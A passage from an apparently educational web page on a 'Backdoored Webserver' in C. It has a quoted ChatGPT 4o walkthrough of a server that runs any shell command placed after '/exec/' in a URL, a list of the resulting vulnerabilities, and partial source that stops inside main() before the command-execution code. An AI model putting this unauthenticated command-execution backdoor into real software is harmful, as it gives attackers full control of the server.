<div id="ethical-ad-placement"
      class="flat"
      data-ea-publisher="readthedocs"
      data-ea-type="readthedocs-sidebar"
      data-ea-manual="true">
</div></div>
  </div>


      </div>
      
      <main id="main-content" class="bd-main" role="main">
        
        

<div class="sbt-scroll-pixel-helper"></div>

          <div class="bd-content">
            <div class="bd-article-container">
              
              <div class="bd-header-article d-print-none">
<div class="header-article-items header-article__inner">
  
    <div class="header-article-items__start">
      
        <div class="header-article-item"><button class="sidebar-toggle primary-toggle btn btn-sm" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
  <span class="fa-solid fa-bars"></span>
</button></div>
      
    </div>
  
  
    <div class="header-article-items__end">
      
        <div class="header-article-item">

<div class="article-header-buttons">





<div class="dropdown dropdown-launch-buttons">
  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Launch interactive content">
    <i class="fas fa-rocket"></i>
  </button>
  <ul class="dropdown-menu">
      
      
      
      <li><a href="https://mybinder.org/v2/gh/markkhusid/MKDynamics_Website_V2/master?urlpath=lab/tree/Sections/Computer_Programming/C/Backdoored_Webserver/backdoored_webserver.ipynb" target="_blank"
   class="btn btn-sm dropdown-item"
   title="Launch on Binder"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  
    <img alt="Binder logo" src="../../../../_static/images/logo_binder.svg">
  </span>
<span class="btn__text-container">Binder</span>
</a>
</li>
      
      
      
      
      <li><a href="https://datahub.berkeley.edu/hub/user-redirect/git-pull?repo=https%3A//github.com/markkhusid/MKDynamics_Website_V2&urlpath=lab/tree/MKDynamics_Website_V2/Sections/Computer_Programming/C/Backdoored_Webserver/backdoored_webserver.ipynb&branch=master" target="_blank"
   class="btn btn-sm dropdown-item"
   title="Launch on JupyterHub"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  
    <img alt="JupyterHub logo" src="../../../../_static/images/logo_jupyterhub.svg">
  </span>
<span class="btn__text-container">JupyterHub</span>
</a>
</li>
      
      
      
      
      <li><a href="https://colab.research.google.com/github/markkhusid/MKDynamics_Website_V2/blob/master/Sections/Computer_Programming/C/Backdoored_Webserver/backdoored_webserver.ipynb" target="_blank"
   class="btn btn-sm dropdown-item"
   title="Launch on Colab"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  
    <img alt="Colab logo" src="../../../../_static/images/logo_colab.png">
  </span>
<span class="btn__text-container">Colab</span>
</a>
</li>
      
      
      
      
      <li>
<button onclick="initThebeSBT()"
  class="btn btn-sm btn-launch-thebe dropdown-item"
  title="Launch Thebe"
  data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-play"></i>
  </span>
<span class="btn__text-container">Live Code</span>
</button>
</li>
      
  </ul>
</div>






<div class="dropdown dropdown-source-buttons">
  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Source repositories">
    <i class="fab fa-github"></i>
  </button>
  <ul class="dropdown-menu">
      
      
      
      <li><a href="https://github.com/markkhusid/MKDynamics_Website_V2" target="_blank"
   class="btn btn-sm btn-source-repository-button dropdown-item"
   title="Source repository"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fab fa-github"></i>
  </span>
<span class="btn__text-container">Repository</span>
</a>
</li>
      
      
      
      
      <li><a href="https://github.com/markkhusid/MKDynamics_Website_V2/issues/new?title=Issue%20on%20page%20%2FSections/Computer_Programming/C/Backdoored_Webserver/backdoored_webserver.html&body=Your%20issue%20content%20here." target="_blank"
   class="btn btn-sm btn-source-issues-button dropdown-item"
   title="Open an issue"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-lightbulb"></i>
  </span>
<span class="btn__text-container">Open issue</span>
</a>
</li>
      
  </ul>
</div>






<div class="dropdown dropdown-download-buttons">
  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Download this page">
    <i class="fas fa-download"></i>
  </button>
  <ul class="dropdown-menu">
      
      
      
      <li><a href="../../../../_sources/Sections/Computer_Programming/C/Backdoored_Webserver/backdoored_webserver.ipynb" target="_blank"
   class="btn btn-sm btn-download-source-button dropdown-item"
   title="Download source file"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-file"></i>
  </span>
<span class="btn__text-container">.ipynb</span>
</a>
</li>
      
      
      
      
      <li>
<button onclick="window.print()"
  class="btn btn-sm btn-download-pdf-button dropdown-item"
  title="Print to PDF"
  data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-file-pdf"></i>
  </span>
<span class="btn__text-container">.pdf</span>
</button>
</li>
      
  </ul>
</div>




<button onclick="toggleFullScreen()"
  class="btn btn-sm btn-fullscreen-button"
  title="Fullscreen mode"
  data-bs-placement="bottom" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-expand"></i>
  </span>

</button>



<button class="btn btn-sm nav-link pst-navbar-icon theme-switch-button pst-js-only" aria-label="Color mode" data-bs-title="Color mode"  data-bs-placement="bottom" data-bs-toggle="tooltip">
  <i class="theme-switch fa-solid fa-sun                fa-lg" data-mode="light" title="Light"></i>
  <i class="theme-switch fa-solid fa-moon               fa-lg" data-mode="dark"  title="Dark"></i>
  <i class="theme-switch fa-solid fa-circle-half-stroke fa-lg" data-mode="auto"  title="System Settings"></i>
</button>


<button class="btn btn-sm pst-navbar-icon search-button search-button__button pst-js-only" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <i class="fa-solid fa-magnifying-glass fa-lg"></i>
</button>
<button class="sidebar-toggle secondary-toggle btn btn-sm" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <span class="fa-solid fa-list"></span>
</button>
</div></div>
      
    </div>
  
</div>
</div>
              
              

<div id="jb-print-docs-body" class="onlyprint">
    <h1>Backdoored Webserver</h1>
    <!-- Table of contents -->
    <div id="print-main-content">
        <div id="jb-print-toc">
            
            <div>
                <h2> Contents </h2>
            </div>
            <nav aria-label="Page">
                <ul class="visible nav section-nav flex-column">
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#introduction">Introduction</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#explanation-of-code-by-chatgpt-4o-openai">Explanation of Code by ChatGPT 4o (OpenAI)</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#key-functionalities"><strong>Key Functionalities</strong></a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#main-components"><strong>Main Components</strong></a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#global-definitions"><strong>Global Definitions</strong></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#main-function"><strong>Main Function</strong></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#helper-functions"><strong>Helper Functions</strong></a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#key-vulnerabilities-and-concerns"><strong>Key Vulnerabilities and Concerns</strong></a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#recommendations"><strong>Recommendations</strong></a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#program-code">Program Code</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#compile-the-code">Compile the Code</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#run-the-code">Run the Code</a></li>
</ul>
            </nav>
        </div>
    </div>
</div>

              
                
<div id="searchbox"></div>
                <article class="bd-article">
                  
  <section class="tex2jax_ignore mathjax_ignore" id="backdoored-webserver">
<h1>Backdoored Webserver<a class="headerlink" href="#backdoored-webserver" title="Link to this heading">#</a></h1>
<a class="reference internal image-reference" href="../../../../_images/backdoored_webserver1.png"><img alt="backdoored_webserver" class="align-center" src="../../../../_images/backdoored_webserver1.png" style="width: 400px;" /></a>
<section id="introduction">
<h2>Introduction<a class="headerlink" href="#introduction" title="Link to this heading">#</a></h2>
<p>In this section, we will discuss the implementation of a backdoored web server in C. The backdoored web server is a simple web server that listens on a specified port and serves files from a specified directory. The backdoor functionality allows an attacker to execute arbitrary commands on the server by sending specially crafted HTTP requests.</p>
</section>
<section id="explanation-of-code-by-chatgpt-4o-openai">
<h2>Explanation of Code by ChatGPT 4o (OpenAI)<a class="headerlink" href="#explanation-of-code-by-chatgpt-4o-openai" title="Link to this heading">#</a></h2>
<p>The provided C code implements a basic HTTP server with a backdoor functionality that listens for incoming HTTP requests, processes them, and executes commands embedded in the URL of the request if specific conditions are met. Here’s a detailed explanation of the code:</p>
<hr class="docutils" />
<section id="key-functionalities">
<h3><strong>Key Functionalities</strong><a class="headerlink" href="#key-functionalities" title="Link to this heading">#</a></h3>
<ol class="arabic simple">
<li><p><strong>Socket Communication:</strong></p>
<ul class="simple">
<li><p>The server listens on a specified port for incoming connections.</p></li>
<li><p>It processes HTTP requests from clients and sends appropriate responses.</p></li>
</ul>
</li>
<li><p><strong>Backdoor Command Execution:</strong></p>
<ul class="simple">
<li><p>If the URL in the HTTP request contains <code class="docutils literal notranslate"><span class="pre">/exec/</span></code>, the server interprets the string after <code class="docutils literal notranslate"><span class="pre">/exec/</span></code> as a system command.</p></li>
<li><p>This command is executed using <code class="docutils literal notranslate"><span class="pre">popen</span></code>, and the output is sent back to the client.</p></li>
</ul>
</li>
<li><p><strong>URL Decoding:</strong></p>
<ul class="simple">
<li><p>Encoded URLs are decoded to retrieve their original form.</p></li>
</ul>
</li>
<li><p><strong>Response Handling:</strong></p>
<ul class="simple">
<li><p>The server can send different HTTP responses: 200 OK, 404 Not Found, or 400 Bad Request.</p></li>
</ul>
</li>
</ol>
</section>
<hr class="docutils" />
<section id="main-components">
<h3><strong>Main Components</strong><a class="headerlink" href="#main-components" title="Link to this heading">#</a></h3>
<section id="global-definitions">
<h4><strong>Global Definitions</strong><a class="headerlink" href="#global-definitions" title="Link to this heading">#</a></h4>
<ul class="simple">
<li><p><strong>Buffer Sizes:</strong>
<code class="docutils literal notranslate"><span class="pre">BUFFER_SIZE</span></code> and other constants are used to define limits for reading data and constructing responses.</p></li>
<li><p><strong>Predefined Responses:</strong>
Strings for various HTTP response codes (<code class="docutils literal notranslate"><span class="pre">200</span> <span class="pre">OK</span></code>, <code class="docutils literal notranslate"><span class="pre">404</span> <span class="pre">Not</span> <span class="pre">Found</span></code>, etc.) are constructed.</p></li>
</ul>
</section>
<section id="main-function">
<h4><strong>Main Function</strong><a class="headerlink" href="#main-function" title="Link to this heading">#</a></h4>
<ol class="arabic simple">
<li><p><strong>Socket Setup:</strong></p>
<ul class="simple">
<li><p>A socket is created and configured to listen on the specified port (<code class="docutils literal notranslate"><span class="pre">socket</span></code> and <code class="docutils literal notranslate"><span class="pre">bind</span></code> calls).</p></li>
<li><p>The <code class="docutils literal notranslate"><span class="pre">setsockopt</span></code> function allows reusing the socket address.</p></li>
</ul>
</li>
<li><p><strong>Listening for Connections:</strong></p>
<ul class="simple">
<li><p>The <code class="docutils literal notranslate"><span class="pre">listen</span></code> function queues incoming connections.</p></li>
<li><p>The server accepts connections with <code class="docutils literal notranslate"><span class="pre">accept</span></code> and processes each request in a loop.</p></li>
</ul>
</li>
<li><p><strong>Processing Requests:</strong></p>
<ul class="simple">
<li><p><strong>Receiving Data:</strong>
Incoming HTTP requests are read into a buffer using <code class="docutils literal notranslate"><span class="pre">recv</span></code>.</p></li>
<li><p><strong>URL Parsing:</strong>
The <code class="docutils literal notranslate"><span class="pre">get_URL_from_header</span></code> function extracts the URL from the HTTP request header.</p></li>
<li><p><strong>URL Decoding:</strong>
The extracted URL is decoded using <code class="docutils literal notranslate"><span class="pre">URL_decode</span></code>.</p></li>
<li><p><strong>Command Handling:</strong></p>
<ul>
<li><p>If the URL contains <code class="docutils literal notranslate"><span class="pre">/exec/</span></code>, the part after it is treated as a shell command.</p></li>
<li><p>The command is executed, and its output is sent to the client as part of the HTTP response.</p></li>
</ul>
</li>
<li><p><strong>Invalid Requests:</strong>
Requests without <code class="docutils literal notranslate"><span class="pre">/exec/</span></code> or malformed URLs receive appropriate error responses (<code class="docutils literal notranslate"><span class="pre">404</span></code> or <code class="docutils literal notranslate"><span class="pre">400</span></code>).</p></li>
</ul>
</li>
<li><p><strong>Response Sending:</strong></p>
<ul class="simple">
<li><p><code class="docutils literal notranslate"><span class="pre">send_response</span></code> sends the constructed response back to the client.</p></li>
</ul>
</li>
</ol>
</section>
<section id="helper-functions">
<h4><strong>Helper Functions</strong><a class="headerlink" href="#helper-functions" title="Link to this heading">#</a></h4>
<ol class="arabic simple">
<li><p><strong><code class="docutils literal notranslate"><span class="pre">send_response</span></code>:</strong>
Sends an HTTP response back to the client socket, handling both successful and error cases.</p></li>
<li><p><strong><code class="docutils literal notranslate"><span class="pre">get_URL_from_header</span></code>:</strong>
Extracts the URL from the first line of the HTTP request header.</p></li>
<li><p><strong><code class="docutils literal notranslate"><span class="pre">URL_decode</span></code>:</strong>
Decodes percent-encoded characters in URLs (e.g., <code class="docutils literal notranslate"><span class="pre">%20</span></code> becomes a space).</p></li>
<li><p><strong><code class="docutils literal notranslate"><span class="pre">does_URL_contain_slash_exec</span></code>:</strong>
Checks if the URL contains the <code class="docutils literal notranslate"><span class="pre">/exec/</span></code> substring.</p></li>
<li><p><strong><code class="docutils literal notranslate"><span class="pre">get_CMD_from_decoded_URL</span></code>:</strong>
Extracts the command from the decoded URL after <code class="docutils literal notranslate"><span class="pre">/exec/</span></code>.</p></li>
<li><p><strong><code class="docutils literal notranslate"><span class="pre">execute_command_return_output</span></code>:</strong>
Executes a shell command using <code class="docutils literal notranslate"><span class="pre">popen</span></code> and captures its output.</p></li>
</ol>
</section>
</section>
<hr class="docutils" />
<section id="key-vulnerabilities-and-concerns">
<h3><strong>Key Vulnerabilities and Concerns</strong><a class="headerlink" href="#key-vulnerabilities-and-concerns" title="Link to this heading">#</a></h3>
<ol class="arabic simple">
<li><p><strong>Backdoor Implementation:</strong></p>
<ul class="simple">
<li><p>The <code class="docutils literal notranslate"><span class="pre">/exec/</span></code> functionality allows remote execution of arbitrary shell commands, creating a severe security vulnerability.</p></li>
</ul>
</li>
<li><p><strong>Unsafe Command Execution:</strong></p>
<ul class="simple">
<li><p>Commands are executed without validation or sanitization, exposing the server to command injection attacks.</p></li>
</ul>
</li>
<li><p><strong>Lack of Authentication:</strong></p>
<ul class="simple">
<li><p>No mechanism to authenticate or authorize incoming requests, making the server open to exploitation.</p></li>
</ul>
</li>
<li><p><strong>Memory Leaks and Errors:</strong></p>
<ul class="simple">
<li><p>The program lacks comprehensive error handling for <code class="docutils literal notranslate"><span class="pre">malloc</span></code> and <code class="docutils literal notranslate"><span class="pre">realloc</span></code>, potentially leading to memory leaks.</p></li>
</ul>
</li>
<li><p><strong>Debug Information Exposure:</strong></p>
<ul class="simple">
<li><p>Printing debug information, such as the request content and decoded commands, can expose sensitive data.</p></li>
</ul>
</li>
<li><p><strong>Non-Threaded Design:</strong></p>
<ul class="simple">
<li><p>The server handles only one request at a time, which is inefficient for multiple clients.</p></li>
</ul>
</li>
</ol>
</section>
<hr class="docutils" />
<section id="recommendations">
<h3><strong>Recommendations</strong><a class="headerlink" href="#recommendations" title="Link to this heading">#</a></h3>
<ul class="simple">
<li><p>Remove or restrict the <code class="docutils literal notranslate"><span class="pre">/exec/</span></code> functionality to prevent unauthorized command execution.</p></li>
<li><p>Implement input validation and sanitization.</p></li>
<li><p>Add authentication mechanisms to ensure only authorized users can interact with the server.</p></li>
<li><p>Use secure coding practices, such as properly managing memory allocations and handling errors.</p></li>
<li><p>Improve the server’s architecture to support concurrent connections, possibly using threading or asynchronous I/O.</p></li>
</ul>
<hr class="docutils" />
<p>This code appears to be designed for demonstration or testing purposes rather than production use due to its significant security flaws.</p>
</section>
</section>
<section id="program-code">
<h2>Program Code<a class="headerlink" href="#program-code" title="Link to this heading">#</a></h2>
<div class="highlight-C notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/socket.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;netinet/in.h&gt;</span>

<span class="c1">// Line below for debug</span>
<span class="c1">//#define PORT 8080</span>

<span class="c1">// Size of the buffer to use for reading data from the socket</span>
<span class="cp">#define BUFFER_SIZE 1024</span>

<span class="c1">// Number of connections to queue</span>
<span class="cp">#define NUM_CONNECTIONS 5</span>

<span class="c1">// Function to send a response to the client</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">send_response</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">sockfd</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">response</span><span class="p">);</span>

<span class="c1">// Function to get the URL from the HTTP header</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">get_URL_from_header</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">buffer_in</span><span class="p">);</span>

<span class="c1">// Function to decode the URL</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">URL_decode</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">URL_in</span><span class="p">);</span>

<span class="c1">// Function to get the command from the decoded URL</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">get_CMD_from_decoded_URL</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">decoded_URL_in</span><span class="p">);</span>

<span class="c1">// Function to check if the URL contains the string &quot;/exec&quot;</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">does_URL_contain_slash_exec</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">URL_in</span><span class="p">);</span>

<span class="c1">// Function to execute a command and return the output to a buffer</span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nf">execute_command_return_output</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">command_in</span><span class="p">);</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
<span class="w">    </span><span class="c1">// Holds the socket file descriptor</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">sockfd</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the new socket file descriptor for the accepted connection</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">new_sockfd</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the port number on which to listen for connections</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">server_port</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Structure that holds the address of the host and client</span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">host_addr</span><span class="p">,</span><span class="w"> </span><span class="n">client_addr</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the size of the structures above</span>
<span class="w">    </span><span class="kt">socklen_t</span><span class="w"> </span><span class="n">sin_size</span><span class="p">;</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// Holds the number of bytes received</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">recv_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// Holds the status of the setsockopt() call</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">yes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// Holds the data received over the socket</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>

<span class="w">    </span><span class="c1">// Holds the URL from the HTTP header</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">URL</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the decoded URL</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">decoded_URL</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the command extracted from the decoded URL</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">backdoor_command</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the output of the command</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">command_output</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// For debug</span>
<span class="w">    </span><span class="c1">// Holds a 200 response to send to the client </span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">http200_response_no_length</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
<span class="w">        </span><span class="s">&quot;HTTP/1.1 200 OK</span><span class="se">\x0D\x0A</span><span class="s">&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="c1">//    &quot;Content-Type: text/html\x0D\x0A&quot;;</span>

<span class="w">    </span><span class="c1">// Holds a 404 response to send to the client (no length field)</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">http404_response_no_length</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
<span class="w">        </span><span class="s">&quot;HTTP/1.1 404 Not Found</span><span class="se">\x0D\x0A</span><span class="s">&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="c1">//    &quot;Content-Type: text/html\x0D\x0A&quot;;i</span>

<span class="w">    </span><span class="c1">// Holds a 400 response to send to the client (no length field)</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">http400_response_no_length</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
<span class="w">        </span><span class="s">&quot;HTTP/1.1 400 Bad Request</span><span class="se">\x0D\x0A</span><span class="s">&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the html code for the 404 response.  May need to nix the HTML</span>
<span class="w">    </span><span class="c1">// and just send the text.</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">http404_html_code</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
<span class="w">        </span><span class="s">&quot;&lt;html&gt;</span><span class="se">\r\n</span><span class="s">&quot;</span>
<span class="w">            </span><span class="s">&quot;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;</span><span class="se">\r\n</span><span class="s">&quot;</span>
<span class="w">                </span><span class="s">&quot;&lt;body&gt;</span><span class="se">\r\n</span><span class="s">&quot;</span>
<span class="w">                    </span><span class="s">&quot;&lt;h1&gt;404 Not Found&lt;/h1&gt;</span><span class="se">\r\n</span><span class="s">&quot;</span>
<span class="w">                    </span><span class="s">&quot;&lt;p&gt;The requested resource could not be found.&lt;/p&gt;</span><span class="se">\r\n</span><span class="s">&quot;</span>
<span class="w">                </span><span class="s">&quot;&lt;/body&gt;</span><span class="se">\r\n</span><span class="s">&quot;</span>
<span class="w">        </span><span class="s">&quot;&lt;/html&gt;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">http404_response_no_html</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
<span class="w">        </span><span class="s">&quot;HTTP/1.1 404 Not Found</span><span class="se">\r\n</span><span class="s">&quot;</span>
<span class="w">        </span><span class="s">&quot;Content-Type: text/html</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="w"> </span>
<span class="w">        </span><span class="s">&quot;404 Not Found</span><span class="se">\r\n</span><span class="s">&quot;</span>
<span class="w">        </span><span class="s">&quot;The requested resource could not be found.</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// This string will will be augmented with the content length</span>
<span class="w">    </span><span class="c1">// not used for now.</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">content_length_string</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Content-Length: &quot;</span><span class="p">;</span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// Quality of life string for adding a carriage return and newline</span>
<span class="w">    </span><span class="c1">// Will tack this on to content_length_string</span>
<span class="w">    </span><span class="c1">//char CR_plus_NL[] = &quot;\x0D\x0A&quot;;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">CR_plus_NL</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x0D\x0A</span><span class="s">&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Silly message to send in the content body.</span>
<span class="w">    </span><span class="c1">// Change to actual html?</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">message_to_send</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Hello, World!</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// The return status of the send function</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">send_status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the content length of the reponse</span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">content_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the built up 200 response to send to the client</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">http200_response</span><span class="p">[</span><span class="mi">8192</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the built up 404 response to send to the client</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">http404_response</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Holds the built up 400 response to send to the client</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">http400_response</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Create normal 200 response to GET request (no length).</span>
<span class="w">    </span><span class="c1">// The 200 response is used for debug.</span>
<span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">http200_response</span><span class="p">,</span><span class="w"> </span><span class="n">http200_response_no_length</span><span class="p">);</span>
<span class="w">    </span><span class="n">strcat</span><span class="p">(</span><span class="n">http200_response</span><span class="p">,</span><span class="w"> </span><span class="n">CR_plus_NL</span><span class="p">);</span>
<span class="w">    </span><span class="c1">//strcat(http200_response, message_to_send);</span>
<span class="w">    </span><span class="c1">//printf(&quot;%s&quot;, http200_response);               // for debug</span>

<span class="w">    </span><span class="c1">// Create a 404 response by combining parts.</span>
<span class="w">    </span><span class="n">strcat</span><span class="w"> </span><span class="p">(</span><span class="n">http404_response</span><span class="p">,</span><span class="w"> </span><span class="n">http404_response_no_length</span><span class="p">);</span>
<span class="w">    </span><span class="n">strcat</span><span class="w"> </span><span class="p">(</span><span class="n">http404_response</span><span class="p">,</span><span class="w"> </span><span class="n">CR_plus_NL</span><span class="p">);</span>
<span class="w">    </span><span class="c1">//strcat (http404_response, http404_html_code);</span>
<span class="w">    </span><span class="c1">// For debug</span>
<span class="w">    </span><span class="c1">//printf(&quot;\n%s&quot;, http404_response);               // for debug</span>

<span class="w">    </span><span class="c1">// Create a 400 response by combining parts.</span>
<span class="w">    </span><span class="n">strcat</span><span class="w"> </span><span class="p">(</span><span class="n">http400_response</span><span class="p">,</span><span class="w"> </span><span class="n">http400_response_no_length</span><span class="p">);</span>
<span class="w">    </span><span class="n">strcat</span><span class="w"> </span><span class="p">(</span><span class="n">http400_response</span><span class="p">,</span><span class="w"> </span><span class="n">CR_plus_NL</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Lines below for debug to see if port was passed in</span>
